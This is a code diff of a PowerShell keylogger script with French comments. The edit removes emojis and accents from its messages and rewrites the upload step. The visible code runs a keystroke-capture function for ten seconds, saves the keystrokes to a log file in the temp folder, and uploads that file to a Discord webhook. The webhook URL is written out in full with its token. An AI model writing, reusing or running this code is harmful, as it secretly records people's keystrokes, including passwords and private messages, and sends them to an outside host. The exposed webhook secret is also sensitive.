@@ -39,12 +39,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $startTime = Get-Date
     $duration = 10
 
-    Write-Host "⏱️  KeyLogger démarré - Arrêt automatique dans $duration secondes..." -ForegroundColor Green
+    Write-Host "KeyLogger demarré - Arret automatique dans $duration secondes..." -ForegroundColor Green
 
     while ($true) {
         $elapsedTime = (Get-Date) - $startTime
         if ($elapsedTime.TotalSeconds -ge $duration) {
-            Write-Host "`n⏹️  KeyLogger arrêté après $duration secondes" -ForegroundColor Red
+            Write-Host "`nKeyLogger arrete apres $duration secondes" -ForegroundColor Red
             break
         }
 
@@ -78,26 +78,27 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
-# 🚀 Lancer le keylogger
+# Lancer le keylogger
 KeyLog
 
-# 📁 Envoyer le fichier sur Discord
+# Envoyer le fichier sur Discord
 $logfile = "$env:temp\key.log"
 $webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
 
-Write-Host "`n📤 Envoi du fichier sur Discord..." -ForegroundColor Yellow
+Write-Host "`nEnvoi du fichier sur Discord..." -ForegroundColor Yellow
 
 if (Test-Path $logfile) {
     try {
-        # Envoyer le fichier directement
-        Invoke-RestMethod -Uri $webhook -Method Post -Form @{
-            "payload_json" = @{content = "🔐 Keylog enregistré"} | ConvertTo-Json
-            "file" = Get-Item $logfile
+        $form = @{
+            "payload_json" = '{"content":"Keylog enregistre"}'
+            "file" = Get-Item -Path $logfile
         }
-        Write-Host "✅ Fichier envoyé avec succès !" -ForegroundColor Green
+        
+        Invoke-RestMethod -Uri $webhook -Method Post -Form $form
+        Write-Host "Fichier envoye avec succes !" -ForegroundColor Green
     } catch {
-        Write-Host "❌ Erreur : $_" -ForegroundColor Red
+        Write-Host "Erreur : $_" -ForegroundColor Red
     }
 } else {
-    Write-Host "❌ Fichier non trouvé" -ForegroundColor Red
+    Write-Host "Fichier non trouve" -ForegroundColor Red
 }
